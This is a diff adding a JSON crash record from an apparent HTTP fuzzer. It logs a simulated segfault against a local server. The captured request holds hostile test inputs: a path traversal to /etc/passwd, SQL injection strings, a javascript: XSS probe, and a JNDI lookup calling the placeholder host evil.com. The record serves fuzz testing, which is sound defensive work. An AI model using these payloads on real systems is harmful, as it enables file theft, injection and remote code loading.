@@ -1,0 +1,24 @@
+{
+  "timestamp": "2025-12-29T14:40:01.555148",
+  "crash_type": "segfault",
+  "payload": "DELETE /..%2f..%2f..%2fetc/passwd?\nHeaders: {'User-Agent': \"' OR '1'='1\", 'Accept-Encoding': \"admin'--\", 'Accept': '*/*', 'Connection': 'close', 'Host': '127.0.0.1:8080', 'X-Forwarded-Proto': 'javascript:alert(1)', 'X-Http-Method-Override': '${jndi:rmi://evil.com/a}', 'Accept-Language': '', 'Content-Length': '0'}",
+  "payload_hash": "5a1490455c4d0e26",
+  "request_method": "DELETE",
+  "request_path": "/..%2f..%2f..%2fetc/passwd?",
+  "request_headers": {
+    "User-Agent": "' OR '1'='1",
+    "Accept-Encoding": "admin'--",
+    "Accept": "*/*",
+    "Connection": "close",
+    "Host": "127.0.0.1:8080",
+    "X-Forwarded-Proto": "javascript:alert(1)",
+    "X-Http-Method-Override": "${jndi:rmi://evil.com/a}",
+    "Accept-Language": "",
+    "Content-Length": "0"
+  },
+  "request_body": "",
+  "error_message": "Simulated segfault",
+  "stack_trace": null,
+  "fuzzer_variant": null,
+  "iteration": 213
+}
